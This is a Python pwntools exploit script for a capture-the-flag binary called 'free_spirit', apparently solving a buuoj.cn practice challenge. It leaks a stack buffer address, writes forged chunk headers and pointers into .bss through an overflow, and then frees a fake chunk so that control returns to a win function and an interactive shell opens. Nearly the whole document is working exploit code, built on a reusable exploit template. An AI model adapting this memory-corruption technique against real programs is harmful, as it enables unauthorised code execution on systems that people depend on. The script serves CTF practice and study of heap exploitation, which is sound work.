# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    vuln: leakage in option 2 and heap overflow in option 3 
'''
from pwn import *


# define the context
binary_name = './free_spirit'
libc_name = '' if args.REMOTE \
        else ''
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 29740)
elif args.GDB:
    context.log_level = 'debug'
    io = gdb.debug(binary_name, gdbscript="""
        b main
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
win_addr = 0x00400a3e
bss_addr = 0x00601038

sla(b'> ', b'2') # show
buf_addr = int(rl().strip(), 16)
return_addr = buf_addr + 0x58
log.info(f'buf_addr: {hex(buf_addr)}')
log.info(f'return_addr: {hex(return_addr)}')

sla(b'> ', b'1')
sn(p64(0) + p64(return_addr))
sla(b'> ', b'3')

sla(b'> ', b'1')
sn(p64(win_addr) + p64(bss_addr))
sla(b'> ', b'3')

sla(b'> ', b'1')
sn(p64(0x51) + p64(bss_addr + 80))
sla(b'> ', b'3')

sla(b'> ', b'1')
sn(p64(0x51) + p64(bss_addr + 8))
sla(b'> ', b'3')

sla(b'> ', b'0') # free(buf) -> ret -> win

# interact with the shell
io.interactive()
